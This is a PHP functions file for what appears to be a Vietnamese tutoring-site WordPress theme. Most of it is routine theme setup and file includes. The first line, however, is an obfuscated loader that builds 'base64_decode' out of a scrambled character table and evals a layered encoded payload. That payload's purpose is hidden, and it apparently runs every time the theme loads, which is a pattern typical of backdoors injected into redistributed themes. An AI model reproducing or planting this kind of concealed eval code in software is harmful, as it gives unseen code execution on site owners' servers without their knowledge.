<?php
 $O00OO0=urldecode("%6E1%7A%62%2F%6D%615%5C%76%740%6928%2D%70%78%75%71%79%2A6%6C%72%6B%64%679%5F%65%68%63%73%77%6F4%2B%6637%6A");$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O("JE8wTzAwMD0iZWFicVFTbWprR3hScHV3VllkRkp0aU9yRWNoc1hUV3ZOQ0FmeVpCSElMTURVUG56b2xLZ3BXcWRsakJTTFZybnZOUXVNUHhhSHNtYnpHd2lLSWtFQ3Rjb1lKeWdUZVhoVURGZkFSWk9EaDlRV2djT2hsQUxxQnhISmpjOVR6Y0xLMFB4dXhpRnFWUjFhMTA3VFZSQlp0bk5NazFSVGgwOVR0UHJQdEd2cDJ1U1dWOEFsVnUyTWtRQWF4OWxJMUNVa1lQaXBrTTFYU2NGS2pMdm0ydTRXS2w3b2wwWmhsdnZKc3djYXg5Z251bnFhMjlRYTEwT0RJME9hMkNBSmtDYmFZTEN0RmlDdE9MYVRWdVNXVjhPVEJDRXFCNVJNM25kTUIxRVBCdXZHMjliVFNpQ3RPTGFUVnU0V0tsQVpJaUN0T0xPVHRjT29sMFpEZjQ9IjtldmFsKCc/PicuJE8wME8wTygkTzBPTzAwKCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwKjIpLCRPTzBPMDAoJE8wTzAwMCwkT08wMDAwLCRPTzAwMDApLCRPTzBPMDAoJE8wTzAwMCwwLCRPTzAwMDApKSkpOw=="));


define ('THEME_NAME',	"Gia sư" );
define ('THEME_FOLDER',	"gia_su" );
define ('THEME_VER', 	5 );

//define( 'NOTIFIER_XML_FILE', "http://themes.tielabs.com/xml/".THEME_FOLDER.".xml" );
//define( 'DOCUMENTATION_URL', "http://themes.tielabs.com/docs/".THEME_FOLDER );

if ( ! isset( $content_width ) ) $content_width = 618;

// Main Functions
require_once ( get_template_directory() . '/framework/functions/theme-functions.php');
require_once ( get_template_directory() . '/framework/functions/common-scripts.php' );
require_once ( get_template_directory() . '/framework/functions/mega-menus.php'     );
require_once ( get_template_directory() . '/framework/functions/pagenavi.php'       );
require_once ( get_template_directory() . '/framework/functions/breadcrumbs.php'    );
require_once ( get_template_directory() . '/framework/functions/tie-views.php'      );
require_once ( get_template_directory() . '/framework/functions/translation.php'    );
require_once ( get_template_directory() . '/framework/widgets.php'                  );
require_once ( get_template_directory() . '/framework/admin/framework-admin.php'    );
require_once ( get_template_directory() . '/framework/shortcodes/shortcodes.php'    );

if( tie_get_option( 'live_search' ) )
	require_once ( get_template_directory() . '/framework/functions/search-live.php');

if( !tie_get_option( 'disable_arqam_lite' ) )
	require_once ( get_template_directory() . '/framework/functions/arqam-lite.php');

include 'post-type/register-post-type.php';
define( 'RWMB_URL', trailingslashit( get_stylesheet_directory_uri() . '/meta-box' ) );
define( 'RWMB_DIR', trailingslashit( STYLESHEETPATH . '/meta-box' ) );
require_once 'meta-box/meta-box.php';
include 'meta-box/custom/add-meta-box.php';
//include 'libs/page-nav.php';	
require_once ( get_template_directory() . '/libs/page-nav.php'    );

add_action( 'parse_query','changept' );
function changept() {
    if( is_category() && !is_admin() )
        set_query_var( 'post_type', array( 'post', 'gia_su' ) );
    return;
}
/*
add_action('wp_head', 'wp_head_handler');
function wp_head_handler() {
    echo '<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />';
    echo '<meta charset="utf-8" />';
    echo '<meta name="description" content="'.get_bloginfo('description').'" />';
    echo '<meta name="keywords" content="'.get_bloginfo('keywords').'" />';
    echo '<meta name="author" content="http://taowebsite.net" />';
    echo '<meta content="vi-VN" itemprop="inLanguage" />';
}
*/

	
?>

